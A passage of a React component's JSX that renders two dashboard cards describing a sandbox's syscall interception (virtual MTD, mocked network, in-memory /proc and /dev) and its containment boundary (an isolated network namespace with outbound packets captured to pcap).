            </div>

            <div style={{ background: "var(--surface-2)", padding: "10px 14px", borderRadius: 6, border: "1px solid var(--border)" }}>
              <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Syscall Interception</div>
              <div style={{ fontSize: 13, fontWeight: 800, color: "#10b981", marginTop: 2 }}>Virtual MTD / Network Mock</div>
              <div style={{ fontSize: 10, color: "var(--muted)" }}>In-memory pseudo /proc &amp; /dev</div>
            </div>

            <div style={{ background: "var(--surface-2)", padding: "10px 14px", borderRadius: 6, border: "1px solid var(--border)" }}>
              <div style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Containment Boundary</div>
              <div style={{ fontSize: 13, fontWeight: 800, color: "#38bdf8", marginTop: 2 }}>Isolated Network Namespace</div>
              <div style={{ fontSize: 10, color: "var(--muted)" }}>Outbound raw packets trapped in pcap</div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
